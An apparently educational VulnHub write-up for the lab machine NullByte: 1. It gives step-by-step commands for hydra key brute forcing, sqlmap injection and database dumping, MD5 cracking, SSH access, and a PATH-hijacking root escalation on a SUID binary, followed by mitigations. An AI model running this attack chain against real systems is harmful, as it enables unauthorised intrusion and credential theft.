# NullByte: 1 — Walkthrough

| Field | Detail |
|---|---|
| Machine | NullByte: 1 |
| Author | ly0n |
| Difficulty | Beginner–Intermediate |
| OS | Linux |

## 🔍 Overview

NullByte: 1 is a Linux machine involving hidden-directory discovery via image EXIF metadata, a weak hardcoded authentication key, SQL injection to dump database credentials, hash cracking, SSH access on a non-standard port, and privilege escalation through PATH hijacking against a SUID binary.

---

## Step 1 – Reconnaissance

**Host discovery:**

```bash
arp-scan -l
```

**Port scanning:**

```bash
nmap -sV -sC -p- -T4 192.168.1.142
```

**Open Ports:**

| Port | Service | Version |
|---|---|---|
| 80 | HTTP | Apache 2.4.10 (Debian) |
| 111 | rpcbind | 2-4 |
| 777 | SSH | OpenSSH 6.7p1 Debian (non-standard port) |
| 49251 | status | RPC #100024 |

---

## Step 2 – Web Enumeration

**Directory brute-forcing:**

```bash
gobuster dir -u http://192.168.1.142 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,jpg -t 50
```

**Found:** `/uploads`, `/javascript`, `/phpmyadmin`

**Homepage source review:**

```bash
curl -s http://192.168.1.142/
```

Revealed an image (`main.gif`) accompanied by a cryptic hint about "the laws of harmony."

**EXIF metadata inspection:**

```bash
wget http://192.168.1.142/main.gif
exiftool main.gif
```

**Found:** The image's Comment field contained a hidden directory name.

---

## Step 3 – Authentication Bypass

Visiting the hidden directory revealed a simple key-based login form, with an HTML comment hinting that the password logic was not database-backed and was relatively weak.

**Brute-forced the key with Hydra:**

```bash
hydra -l none -P /usr/share/wordlists/rockyou.txt 192.168.1.142 -s 80 -t 16 \
  http-post-form "/<hidden_dir>/index.php:key=^PASS^:invalid key"
```

**Key recovered**, which unlocked a username search feature (`420search.php`).

---

## Step 4 – SQL Injection

**Confirmed the injection point:**

```bash
curl -s "http://192.168.1.142/<hidden_dir>/420search.php?usrtosearch=1'"
```

**Enumerated databases with sqlmap:**

```bash
sqlmap -u "http://192.168.1.142/<hidden_dir>/420search.php?usrtosearch=1" --dbs --batch
```

**Dumped the application database:**

```bash
sqlmap -u "http://192.168.1.142/<hidden_dir>/420search.php?usrtosearch=1" -D seth --dump-all --batch
```

**Found:** A `users` table containing a username and a Base64-encoded password hash.

---

## Step 5 – Decoding & Cracking the Password

**Base64-decoded** the stored value, revealing an MD5 hash.

**Cracked the hash with John the Ripper:**

```bash
echo "<md5_hash>" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result:** Valid credentials recovered for a system user.

---

## Step 6 – Initial Access via SSH

```bash
ssh <user>@192.168.1.142 -p 777
```

**Result:** Successfully authenticated using the cracked credentials on the non-standard SSH port.

---

## Step 7 – Privilege Escalation (PATH Hijacking)

**Enumerated SUID binaries:**

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Found:** An unusual SUID-root binary at `/var/www/backup/procwatch`.

**Inspected its behavior:**

```bash
cd /var/www/backup/
ls -la
./procwatch
```

The binary internally called `ps` **without using an absolute path**, relying on the `$PATH` environment variable.

**Exploited via PATH hijacking:**

```bash
echo "/bin/sh" > ps
chmod 777 ps
export PATH=.:$PATH
./procwatch
```

By placing a fake `ps` script (spawning `/bin/sh`) in the current directory and prepending it to `$PATH`, the SUID binary executed the fake script instead of the real `ps` — with root privileges.

**Result:** Root shell obtained.

---

## Step 8 – Flag Capture

```bash
id
cd /root
ls
cat proof.txt
```

**Confirmed:** `euid=0(root)` — full root privileges obtained.

✅ **Root flag captured — machine fully compromised.**

---

## 🛡️ Key Vulnerabilities Identified

1. Sensitive path information hidden in image EXIF metadata rather than properly secured
2. Weak, hardcoded authentication key protecting a sensitive feature
3. SQL injection vulnerability allowing full database dump via `sqlmap`
4. Weakly hashed (unsalted MD5) and crackable password storage
5. SSH running on a non-standard port did not prevent credential-based access
6. SUID-root binary calling external commands (`ps`) without an absolute path, enabling PATH hijacking

## 🩹 Mitigations

1. Never rely on metadata or "security through obscurity" to hide sensitive paths
2. Avoid hardcoded authentication keys; use proper credential management
3. Use parameterized queries/prepared statements to prevent SQL injection
4. Store passwords using strong, salted hashing algorithms (bcrypt, Argon2)
5. Enforce strong password policies to resist offline cracking
6. Always use absolute paths for external command calls within SUID/privileged binaries
7. Regularly audit SUID binaries and remove unnecessary ones
8. Apply the principle of least privilege throughout the system

---

## 🧰 Tools Used

`arp-scan` · `nmap` · `gobuster` · `exiftool` · `hydra` · `sqlmap` · `john the ripper` · `ssh`

## 🧠 Techniques Covered

Host & port discovery · Web enumeration · EXIF metadata analysis · Authentication brute-forcing · SQL injection · Hash decoding and cracking · SSH access on non-standard ports · SUID PATH hijacking privilege escalation

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Reconnaissance | ✅ |
| 2 | Web Enumeration | ✅ |
| 3 | Authentication Bypass | ✅ |
| 4 | SQL Injection | ✅ |
| 5 | Decoding & Cracking the Password | ✅ |
| 6 | Initial Access via SSH | ✅ |
| 7 | Privilege Escalation (PATH Hijacking) | ✅ |
| 8 | Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of educational VulnHub practice.*
